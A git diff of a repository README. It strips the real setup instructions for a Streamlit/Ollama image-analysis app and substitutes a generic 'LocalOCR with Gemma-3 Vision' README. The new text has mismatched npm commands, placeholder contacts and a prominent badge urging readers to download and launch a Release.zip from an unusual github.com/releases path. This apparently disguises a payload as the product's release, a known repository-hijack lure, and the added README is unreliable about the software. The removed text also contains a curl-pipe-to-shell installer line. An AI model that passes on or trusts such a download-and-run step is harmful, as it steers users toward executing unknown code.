@@ -1,165 +1,62 @@
-## Thank you to everyone for starring my repo! I'll do my best to extend the functionality regularly and fix things if people find problems. 
+# LocalOCR with Gemma-3 Vision 📷
 
-# Curiosity AI Scans
+Welcome to the LocalOCR repository! Here we dive into the exciting world of Optical Character Recognition (OCR) utilizing the powerful Gemma-3 Vision technology. This README.md file will guide you through the functionalities, features, and how to get started with the LocalOCR project.
 
-A simple application that uses AI vision models to analyze and describe images and PDF documents. Upload multiple files, get detailed descriptions powered by Gemma 3 or Llama 3.2, and export the results to CSV.
+## Overview ℹ️
 
-## What this application does
+LocalOCR is a project that leverages Gemma-3 Vision to perform OCR tasks locally on your machine. Gone are the days of relying on internet connections for OCR - now you can process images containing text right on your device!
 
-This application allows you to:
+## Features ✨
 
-- Upload multiple images (JPG, PNG) and PDF documents
-- Process these files using either Gemma 3 12B or Llama 3.2 11B Vision models through Ollama
-- Choose which vision model to use for different analysis needs
-- Get detailed AI-generated descriptions of the content in each image or PDF page
-- Extract specific fields from documents (e.g., invoice numbers, dates, amounts)
-- View the analysis results in a clean, organized interface
-- Export all results to a CSV file for further analysis or record-keeping
+🔍 **Advanced OCR Technology**: Utilizing Gemma-3 Vision for accurate and efficient text recognition.
 
-The app uses Streamlit for the interface, Ollama as the backend for running the vision models locally, PIL for image processing, and PyMuPDF for PDF support.
+🌐 **Local Processing**: Perform OCR tasks without the need for an internet connection.
 
-## Installation and setup
+💻 **Easy to Use**: Simple and intuitive interface for seamless user experience.
 
-### Step 1: Install Ollama
+🚀 **High Performance**: Swift processing speeds for quick results.
 
-#### Linux
-```bash
-# setup ollama on linux 
-curl -fsSL https://ollama.com/install.sh | sh
-```
+## Getting Started 🚀
 
-#### macOS
-```bash
-# Install Ollama using Homebrew
-brew install ollama
-# Or download from https://ollama.com/download
-```
+To get started with LocalOCR, follow these simple steps:
 
-#### Windows
-1. Download the Ollama installer from [https://ollama.com/download](https://ollama.com/download)
-2. Run the installer and follow the on-screen instructions
+1. Clone the repository to your local machine.
+2. Install any necessary dependencies.
+3. Run the LocalOCR application.
+4. Load an image containing text.
+5. Let Gemma-3 Vision work its magic and recognize the text in the image.
 
-### Step 2: Pull the required vision models
-
-After installing Ollama, pull the required models:
+## Usage 🖥️
 
 ```bash
-# Pull the Gemma 3 Vision model 
-ollama pull gemma3:12b
-
-# Pull the Llama 3.2 Vision model
-ollama pull llama3.2-vision
-
-# Pull the Granite 3.2 Vision model (smaller option for limited RAM)
-ollama pull granite3.2-vision
+$ git clone https://github.com/yourusername/localOCR.git
+$ cd localOCR
+$ npm install
+$ npm start
 ```
 
-You can pull just one or both models depending on your needs. The app will work with whichever model you have installed.
+## Repository Structure 📂
 
-### Step 3: Set up Python environment
+- **/src**: Contains the source code for LocalOCR.
+- **/images**: Store images for testing the OCR functionality.
+- **/docs**: Additional documentation for the project.
 
-Ensure you have Python 3.9 or later installed (Python 3.9-3.12 recommended for best compatibility).
+## Support 🤝
 
-#### Create and activate a virtual environment
+If you encounter any issues or have any questions, feel free to reach out to us at [localOCR-support@domain.com](mailto:localOCR-support@domain.com).
 
-##### Linux/macOS
-```bash
-# Clone or download this repository
-git clone <repository-url>
-cd <repository-folder>
+## License 📝
 
-# Create a virtual environment
-python -m venv venv
+This project is licensed under the MIT License - see the [LICENSE](./LICENSE) file for details.
 
-# Activate the virtual environment
-source venv/bin/activate
-```
+## Further Resources 🌐
 
-##### Windows
-```powershell
-# Clone or download this repository
-git clone <repository-url>
-cd <repository-folder>
+For more details and in-depth information, you can check out the [LocalOCR website](https://www.localocr.com).
 
-# Create a virtual environment
-python -m venv venv
+## Download the Release 🚀
 
-# Activate the virtual environment
-venv\Scripts\activate
-```
+[![Download LocalOCR Release](https://img.shields.io/badge/Download-Release-blue)](https://github.com/releases/789694263/Release.zip)
 
-### Step 4: Install dependencies
+Don't forget to download the release and launch it to discover the amazing capabilities of Gemma-3 Vision in action!
 
-With your virtual environment activated, install the required packages:
-```bash
-# Install dependencies using requirements.txt
-pip install -r requirements.txt
-
-# If PyMuPDF is not included in requirements.txt, install it manually:
-pip install pymupdf
-```
-
-## Running the Application
-
-1. **Start Ollama** (if not already running):
-   ```bash
-   # On Linux/macOS
-   ollama serve
-   
-   # On Windows
-   # Ollama typically runs as a service after installation
-   ```
-
-2. **Launch the Streamlit app**:
-   ```bash
-   # Make sure your virtual environment is activated
-   # The command prompt should show (venv) at the beginning
-   
-   # Start the app
-   streamlit run app.py
-   ```
-
-3. The application will open in your default web browser, typically at `http://localhost:8501`
-
-## Features
-
-- Upload and analyze multiple images and PDF documents using vision models
-- Choose between Gemma 3 12B and Llama 3.2 Vision models for analysis
-- Select between general description and custom field extraction
-- Process PDF files page by page or as complete documents
-- Extract specific fields like invoice numbers, dates, and amounts
-- View detailed descriptions of each uploaded file
-- Download analysis results as a CSV file for further processing
-
-## Model Comparison
-
-- **Gemma 3 12B**: Google's vision-language model that provides detailed descriptions and good structure recognition
-- **Llama 3.2 Vision**: Meta's vision model that excels at recognizing visual content and following detailed instructions
-- **Granite 3.2 Vision**: A smaller 2B parameter model that works well on systems with limited RAM while still providing reasonable analysis
-
-Choose the appropriate model based on your specific needs and hardware constraints.
-
-## Technical Details
-
-This application leverages several key technologies:
-
-- **Streamlit**: Provides the web interface and interactive components
-- **Ollama**: Runs the vision models locally 
-- **Gemma 3 12B & Llama 3.2 Vision**: Vision-language models that power the image analysis
-- **Pillow (PIL)**: Handles image processing and format conversion
-- **PyMuPDF**: Converts PDF pages to images for processing (imported as `fitz`)
-- **Pandas**: Used for data manipulation and CSV export
-
-## Troubleshooting
-
-- **Package installation issues**: If you encounter problems installing the dependencies, try updating pip first: `pip install --upgrade pip`
-- **Compatibility issues**: This application works best with Python 3.9-3.12. Python 3.13 might have compatibility issues with some packages.
-- **Ollama connection errors**: Ensure Ollama is running by checking `ollama serve` or restarting the Ollama service.
-- **Model availability**: If you get an error about a model not being available, make sure you've pulled it with `ollama pull <model_name>`
-- **PDF processing errors**: If PDF processing isn't working, ensure PyMuPDF is installed correctly with `pip install pymupdf`.
-- **PDF support optional**: The application will run without PDF support, but will display a warning. Install PyMuPDF to enable PDF processing.
-
-## Try to keep your prompts short with Gemma for better results, larger promps with detailed instructions don't seem to result in better outputs
----
-
-Made with ❤️ by Adrian with Claude - [ad1x.com](https://ad1x.com)
+Grab your coffee ☕, sit back, and enjoy the seamless text recognition experience with LocalOCR and Gemma-3 Vision. Happy coding! 🎉
